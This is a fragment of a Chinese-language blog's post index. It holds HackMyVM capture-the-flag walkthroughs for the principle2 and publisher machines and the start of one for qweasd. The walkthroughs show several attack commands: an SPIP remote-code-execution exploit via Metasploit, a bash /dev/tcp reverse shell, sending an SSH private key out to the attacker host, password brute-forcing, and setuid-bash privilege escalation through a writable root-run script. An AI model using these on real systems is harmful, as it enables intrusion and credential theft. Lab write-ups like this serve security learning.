4.\u63d0\u6743\n\n\u4e0a\u6765\u4ee5\u540e\u8f6c\u4e86\u4e00\u5708\u90fd\u6ca1\u53d1\u73b0\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4e1c\u897f\uff0c\u6211\u5c31\u76f4\u63a5\u7529\u4e86\u4e00\u4e2alinpeas.sh\u4e0a\u6765\u4e86,\u4e5f\u65e0\u679c\uff0c\u4f46\u662f\u67e5\u770bpspy\u770b\u5b9a\u65f6\u4efb\u52a1\u7684\u65f6\u5019\u53d1\u73b0\u4e86\u8fd9\u4e2a\n\n![image](https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b)\n\n\u4f46\u662f\u6211\u4eec\u6ca1\u6709\u4fee\u6539\u7684\u6743\u9650\n\n```bash\nwww-data@principle2:/tmp$ ls -la /usr/local/share/report\n-rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report\n\nprinciple2:/home/talos$ sudo -u talos cat /usr/local/share/report > /tmp/report\nwww-data@principle2:/home/talos$ cd /tmp/\nwww-data@principle2:/tmp$ cat report > /dev/tcp/192.168.205.141/7777\n```\n\n\u62f7\u8fc7\u6765\u770b\u770b\u5177\u4f53\u8fd0\u884c\u4ec0\u4e48\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ strings report \n/lib64/ld-linux-x86-64.so.2\nfgets\nrewind\nperror\nfread\nexit\nfopen\nstrstr\npclose\n__libc_start_main\n__cxa_finalize\npopen\nfclose\nfputs\nfwrite\nlibc.so.6\nGLIBC_2.2.5\nGLIBC_2.34\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nPTE1\nu+UH\nwrite www-data\nYou are not allowed to be here\nError sending message to www-data\n/opt/users.txt\nError opening output file\nError executing 'who' command\nwww-data\nNew information appended to '/opt/users'\nNo new information to append\n;*3$'\nGCC: (Debian 13.2.0-5) 13.2.0\nScrt1.o\n__abi_tag\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nreport.c\n__FRAME_END__\n_DYNAMIC\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_start_main@GLIBC_2.34\n_ITM_deregisterTMCloneTable\nfread@GLIBC_2.2.5\n_edata\nfclose@GLIBC_2.2.5\n_fini\nrewind@GLIBC_2.2.5\npclose@GLIBC_2.2.5\nfputs@GLIBC_2.2.5\nfgets@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n_end\nnotifyNotAllowed\n__bss_start\nmain\npopen@GLIBC_2.2.5\nfopen@GLIBC_2.2.5\nperror@GLIBC_2.2.5\nexit@GLIBC_2.2.5\nfwrite@GLIBC_2.2.5\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@GLIBC_2.2.5\n_init\nstrstr@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.property\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n                       \n```\n\n\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u660e\u663e\u5229\u7528\u70b9\uff0c\u60f3\u7740\u62ff\u4e4b\u524d\u7684\u5bc6\u7801\u5c1d\u8bd5\u767b\u5f55\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u6709\u4e4b\u524d**SMB\u670d\u52a1**\u7684`hermanubis`\u7528\u6237\uff08\u9a82\u7684\u5f88\u810f\uff09\n\n```bash\nwww-data@principle2:/tmp$ ls /home/\nbyron  city  hermanubis  melville  talos\n\nwww-data@principle2:/tmp$ su - hermanubis\nPassword: \n$ id\nuid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)\n$ sudo -l\nMatching Defaults entries for hermanubis on principle2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser hermanubis may run the following commands on principle2:\n    (talos) NOPASSWD: /usr/bin/cat\n\n$ cd /home/hermanubis\n$ ls\ninvestigation.txt  share  user.txt\n$ cat investigation.txt \nI am aware that Byron hates me... especially since I lost my password.\nMy friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....\nWhat he doesn't know is that it is in the Byron database...\n\n# \u7ffb\u8bd1\n\u6211\u77e5\u9053\u62dc\u4f26\u8ba8\u538c\u6211\u2026\u2026\u5c24\u5176\u662f\u81ea\u4ece\u6211\u5fd8\u8bb0\u5bc6\u7801\u4e4b\u540e\u3002\n\u6211\u548c\u6211\u7684\u670b\u53cb\u4eec\u7ecf\u8fc7\u591a\u6b21\u5206\u6790\u548c\u653b\u51fb\uff0c\u53d1\u73b0\u6885\u5c14\u7ef4\u5c14\u4f7f\u7528\u7684\u5bc6\u7801\u662f 32 \u4e2a\u5b57\u7b26\u2026\u2026\n\u4f46\u4ed6\u4e0d\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u5bc6\u7801\u5c31\u5728\u62dc\u4f26\u7684\u6570\u636e\u5e93\u4e2d\u2026\u2026\n```\n\nByron\u5c31\u662f\u4e4b\u524d\u90a3\u4e2a\u5e02\u957f\uff0c32\u4e2a\u5b57\u7b26\u5c31\u662f\u90a3\u4e2a16\u8fdb\u5236\u8868\uff0c\u62ff\u8fc7\u6765\u7206\u7834\u4e00\u4e0b\u5c31\u597d\u4e86\n\n```bash\n$ cd /tmp\n$ ./suForce -u melville -w a.txt \n            _____                        \n ___ _   _ |  ___|__  _ __ ___ ___   \n/ __| | | || |_ / _ \\| '__/ __/ _ \\ \n\\__ \\ |_| ||  _| (_) | | | (_|  __/  \n|___/\\__,_||_|  \\___/|_|  \\___\\___|  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ud83c\udfaf Username | melville\n\ud83d\udcd6 Wordlist | a.txt\n\ud83d\udd0e Status   | 54/1001/5%/1bd5528b6def9812acba8eb21562c3ec\n\ud83d\udca5 Password | 1bd5528b6def9812acba8eb21562c3ec\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\n$ su - melville\nPassword: \nroot is watching you, it has a record of all your steps:\n\nmelville@principle2:~$ id\nuid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)\n\n```\n\nmelville\u7528\u6237\u6709`talos`\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u4fee\u6539/usr/local/share/report\u6587\u4ef6\uff0c\u6211\u4eec\u628abash\u52a0\u4e2a\u6743\u9650\u5c31\u597d\u4e86\n\n```bash\nmelville@principle2:~$ vi /usr/local/share/report\nmelville@principle2:~$ cat /usr/local/share/report\n#!/bin/bash\nchmod +s /bin/bash\n```\n\n\u7136\u540e\u7b49\u5c31\u597d\u4e86\uff0c\u7b49\u5b83\u5b9a\u65f6\u4efb\u52a1\u89e6\u53d1\n\n```bash\nmelville@principle2:/tmp$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash\nmelville@principle2:/tmp$ bash -p\nbash-5.2# id\nuid=1003(melville) gid=1003(melville) euid=0(root) egid=0(root) groups=0(root),1000(talos),1003(melville)\n\n```\n\n\u4e0b\u73edsentence", "top": 0, "createdAt": 1751016811, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P112": {"htmlDir": "docs/post/hmv_publisher.html", "labels": ["HackMyVM"], "postTitle": "hmv_publisher", "postUrl": "post/hmv_publisher.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/112", "commentNum": 0, "wordCount": 12990, "description": "# hmv_publisher\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Leet\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.211\n**\u672c\u673a** IP\uff1a192.168.205.141\n\n---\n\n### **1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST\nNmap scan report for 192.168.205.211\nHost is up (0.0012s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\nMAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.99 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n---\n\n### **2. Web \u670d\u52a1\u63a2\u6d4b\u4e0e\u76ee\u5f55\u7206\u7834**\n\n\u5bf9 80 \u7aef\u53e3\u611f\u5174\u8da3\uff0c\u8bbf\u95ee Web \u9875\u9762\uff0c\u53d1\u73b0\u5176\u662f\u4e00\u4e2a\u9759\u6001\u9875\u9762\uff0c\u5305\u542b\u591a\u4e2a\u951a\u70b9\u3002\u4f7f\u7528 `whatweb` \u63a2\u6d4b\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ whatweb http://192.168.205.211/   \nhttp://192.168.205.211/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], Title[Publisher's Pulse: SPIP Insights & Tips]\n```\n\n\u5355\u7eaf\u9759\u6001\u9875\uff0c\u76ee\u5f55\u7206\u7834\u5427\u3002\n\n\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.211/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.211/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/images               (Status: 301) [Size: 319] [--> http://192.168.205.211/images/]\n/index.html           (Status: 200) [Size: 8686]\n/spip                 (Status: 301) [Size: 317] [--> http://192.168.205.211/spip/]\n/.html                (Status: 403) [Size: 280]\n/.php                 (Status: 403) [Size: 280]\n/server-status        (Status: 403) [Size: 280]\nProgress: 2314636 / 6369165 (36.34%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 2319486 / 6369165 (36.42%)\n===============================================================\nFinished\n===============================================================\n                                                          \n```\n\n\u7206\u7834\u7ed3\u679c\u663e\u793a `/images` \u548c `/spip` \u76ee\u5f55\u5b58\u5728\uff0c\u5e76\u4e14 `/spip/` \u770b\u8d77\u6765\u662f\u4e2a\u611f\u5174\u8da3\u7684\u76ee\u6807\u3002\n\n---\n\n### **3. \u5229\u7528 SPIP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e**\n\n\u8bbf\u95ee `http://192.168.205.211/spip/`\n\n![image](https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3)\n\n\u4f7f\u7528 `whatweb` \u63a2\u6d4b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ whatweb http://192.168.205.211/spip/   \nhttp://192.168.205.211/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.205.211/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]\n\n```\n\n\u4f7f\u7528 `searchsploit` \u67e5\u627e\u76f8\u5173\u7684\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit SPIP 4.2.0                                                                                  \n----------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                       |  Path\n----------------------------------------------------------------------------------------------------- ---------------------------------\nSPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                | php/webapps/51536.py\n----------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                      \n```\n\n\u627e\u5230\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e (`SPIP v4.2.0 - Remote Code Execution (Unauthenticated)`),\u5229\u7528\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 51536.py \nusage: 51536.py [-h] -u URL -c COMMAND [-v]\n51536.py: error: the following arguments are required: -u/--url, -c/--command\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 51536.py -u http://192.168.205.211/spip/ -c id\nTraceback (most recent call last):\n  File '/home/kali/test/51536.py', line 63, in <module>\n    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'\n```\n\n\u62a5\u9519\uff0c\u6362 Metasploit \u5229\u7528\u8be5\u6f0f\u6d1e\uff1a\n\n```bash\nmsfconsole\nmsf6 > search SPIP 4.2\n\nMatching Modules\n================\n\n   #   Name                                             Disclosure Date  Rank       Check  Description\n   -   ----                                             ---------------  ----       -----  -----------\n   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE\n   1     \\_ target: PHP In-Memory                       .                .          .      .\n   2     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   3     \\_ target: Windows Command Shell               .                .          .      .\n   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin\n   5     \\_ target: PHP In-Memory                       .                .          .      .\n   6     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   7     \\_ target: Windows Command Shell               .                .          .      .\n   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection\n   9     \\_ target: PHP In-Memory                       .                .          .      .\n   10    \\_ target: Unix/Linux Command Shell            .                .          .      .\n   11    \\_ target: Windows Command Shell               .                .          .      .\n\n\nInteract with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form\nAfter interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'\n\nmsf6 > use 0\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > show options \n\nModule options (exploit/multi/http/spip_bigup_unauth_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   FORM_PAGE  Auto             yes       A page with a form.\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas\n                                         ploit.html\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                yes       Path to Spip install\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.205.141  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   PHP In-Memory\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > set RHOSTS http://192.168.205.211/spip/\nRHOSTS => http://192.168.205.211/spip/\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > run\n\n[*] Started reverse TCP handler on 192.168.205.141:4444 \n[*] Running automatic check ('set AutoCheck false' to disable)\n[*] SPIP Version detected: 4.2.0\n[+] SPIP version 4.2.0 is vulnerable.\n[*] Bigup plugin version detected: 3.2.1\n[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.\n[*] Found formulaire_action: login\n[*] Found formulaire_action_args: CKNCtIY6q36vgXbnqHlnO...\n[*] Preparing to send exploit payload to the target...\n[*] Sending stage (40004 bytes) to 192.168.205.211\n[*] Meterpreter session 1 opened (192.168.205.141:4444 -> 192.168.205.211:44672) at 2024-12-29 12:41:44 +0800\n\nmeterpreter > shell\nProcess 52 created.\nChannel 0 created.\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u6210\u529f\u83b7\u5f97 Meterpreter shell\n\n---\n\n### **4. \u83b7\u5f97\u66f4\u7a33\u5b9a\u7684 shell**\n\n\u4e3a\u4e86\u83b7\u5f97\u66f4\u7a33\u5b9a\u7684 shell\uff0c\u521b\u5efa\u4e00\u4e2a\u53cd\u5411 shell \u811a\u672c\uff0c\u5e76\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\uff1a\n\n```bash\ncat a.sh  \nbash -i >& /dev/tcp/192.168.205.141/8888 0>&1  \nchmod +x a.sh  \nbash a.sh\n```\n\n\u83b7\u5f97\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n---\n\n### **5. \u83b7\u53d6** **\u200b**\u200b**\u200b`think`\u200b**\u200b**\u200b** **\u7528\u6237 SSH \u5bc6\u94a5**\n\n\u8bbf\u95ee `/home/` \u76ee\u5f55\uff0c\u53d1\u73b0 `think` \u7528\u6237\u76ee\u5f55\u4e0b\u7684 `.ssh` \u76ee\u5f55\u5177\u6709\u8bfb\u53d6\u6743\u9650\u3002\u7531\u4e8e\u672c\u673a\u6ca1\u6709 SSH \u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u901a\u8fc7 `cat` \u5c06\u79c1\u94a5\u4f20\u8f93\u56de\u653b\u51fb\u673a\uff0c\u5e76\u767b\u5f55\u5230\u76ee\u6807\u673a\u5668\uff1a\n\n#### \u76ee\u6807\u673a\u5668\uff1a\n\n```bash\ncat id_rsa > /dev/tcp/192.168.205.141/7777\n```\n\n#### \u653b\u51fb\u673a\uff1a\n\n```bash\nnc -lvnp 7777 > id_rsa  \nchmod 600 id_rsa  \nssh think@192.168.205.211 -i id_rsa\n```\n\n\u6210\u529f\u767b\u5f55 `think` \u7528\u6237\uff1a\n\n```bash\nthink@publisher:~$ id  \nuid=1000(think) gid=1000(think) groups=1000(think)\n```\n\n---\n\n### **6. \u4f7f\u7528** **\u200b**\u200b**\u200b`linpeas`\u200b**\u200b**\u200b** **\u67e5\u627e\u63d0\u6743\u6f0f\u6d1e**\n\n\u5c06 `linpeas.sh` \u811a\u672c\u4e0a\u4f20\u81f3\u76ee\u6807\u673a\u5668\uff1a\n\n```bash\nthink@publisher:~$ curl 192.168.205.141:8000/linpeas.sh -o /home/think/linpeas.sh  \nthink@publisher:~$ chmod +x linpeas.sh  \nthink@publisher:~$ bash linpeas.sh\n```\n\n\u5728\u811a\u672c\u8f93\u51fa\u4e2d\uff0c\u53d1\u73b0\u4e00\u4e2a\u672a\u77e5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6 `/usr/sbin/run_container`\uff0c\u901a\u8fc7 `strings` \u547d\u4ee4\u8fdb\u884c\u5206\u6790\uff1a\n\n```bash\nthink@publisher:~$ strings /usr/sbin/run_container\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\n__stack_chk_fail\nexecve\n__cxa_finalize\n__libc_start_main\nGLIBC_2.2.5\nGLIBC_2.4\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nu+UH\n[]A\\A]A^A_\n/bin/bash\n/opt/run_container.sh\n:*3$'\nGCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.8061\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nrun_container.c\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\n_ITM_deregisterTMCloneTable\n_edata\n__stack_chk_fail@@GLIBC_2.4\n__libc_start_main@@GLIBC_2.2.5\nexecve@@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n__libc_csu_init\n__bss_start\nmain\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.property\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.plt.sec\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.data\n.bss\n.comment\n```\n\n\u53d1\u73b0\u8be5\u4e8c\u8fdb\u5236\u6587\u4ef6\u4f3c\u4e4e\u4e0e `/bin/bash`\u3001`/opt/run_container.sh`\uff0c\u4f3c\u4e4e\u662f\u4f7f\u7528bash\u8fd0\u884c`/opt/run_container.sh`\u3002\u4f46\u662f\u5f53\u6211\u67e5\u770b`/opt/run_container.sh`\u65f6\u53d1\u73b0\u6211\u6ca1\u6709`/opt/`\u76ee\u5f55\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u7136\u540e\u5c31\u6b47b\u4e86\uff0c\u5b9e\u5728\u505a\u4e0d\u51fa\u6765\u6211\u5c31\u53bb\u770b\u5176\u4ed6\u5e08\u5085\u7684wp\u4e86\uff0c\u770b\u7684\u662f`ll104567`\u548c`HGBE`\u4e24\u4f4d\u5e08\u5085\u7684wp,\u53d1\u73b0\u5f53\u524d\u4f7f\u7528\u7684\u662f`\u53d7\u9650\u5916\u58f3`,\u9700\u8981\u7ed5\u8fc7\u3002\n\n---\n\n### **7. \u63d0\u6743\u4e3a root**\n\n\u901a\u8fc7\u52a8\u6001\u94fe\u63a5\u5e93\u751f\u6210 `bash` shell \u6765\u63d0\u6743\u3002\u9996\u5148\uff0c\u52a0\u8f7d `bash` \u6240\u9700\u7684\u5171\u4eab\u5e93\uff1a\n\n```bash\n/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash\n```\n\n\u8fd0\u884c `/usr/sbin/run_container`\u8ba9\u5b83\u89e6\u53d1\u6267\u884c`/opt/run_container.sh`\uff0c\u5e76\u4fee\u6539`/opt/run_container.sh`\u811a\u672c\uff1a\n\n```bash\nthink@publisher:~$ echo '#!/bin/bash' > /opt/run_container.sh\nthink@publisher:~$ echo 'chmod +s /bin/bash' >> /opt/run_container.sh\nthink@publisher:~$/usr/sbin/run_container\nthink@publisher:~$ cat /opt/run_container.sh\n#!/bin/bash  \nchmod +s /bin/bash  \n```\n\n\u7136\u540e\u4f7f\u7528 `bash -p` \u63d0\u5347\u6743\u9650\u4e3a root\uff1a\n\n```bash\nthink@publisher:~$ bash -p  \nbash-5.0# id \nuid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)\n```\n\n---\n\n\u6210\u529f\u83b7\u53d6 root \u6743\u9650\u540e\uff0c\u5df2\u5b8c\u5168\u63a7\u5236\u76ee\u6807\u7cfb\u7edf\u3002\n\n### \u53c2\u8003\n\n[HGBE](https://hgbe02.github.io/Hackmyvm/publisher.html)\n\n[ll104567](https://www.bilibili.com/video/BV1TM4m1U7y4/)\n\n[voltage](https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d)sentence", "top": 0, "createdAt": 1751016814, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P113": {"htmlDir": "docs/post/hmv_qweasd.html", "labels": ["HackMyVM"], "postTitle": "hmv_qweasd", "postUrl": "post/hmv_qweasd.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/113", "commentNum": 0, "wordCount": 15752, "description": "# hmv_qweasd\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Qweasd\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.217\n**\u672c\u673a** IP\uff1a192.168.205.141\n\n---\n\n## **1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST\nNmap scan report for 192.168.205.217\nHost is up (0.00040s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n8080/tcp open  http    Jetty 10.0.18\nMAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.23 seconds\n                                                                 \n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u3001 80 (HTTP)\u3002\n\n## **2. Web \u670d\u52a1\u63a2\u6d4b\u4e0e\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6**\n\n\u5bf9 80 \u7aef\u53e3\u611f\u5174\u8da3\uff0c\u8bbf\u95ee Web 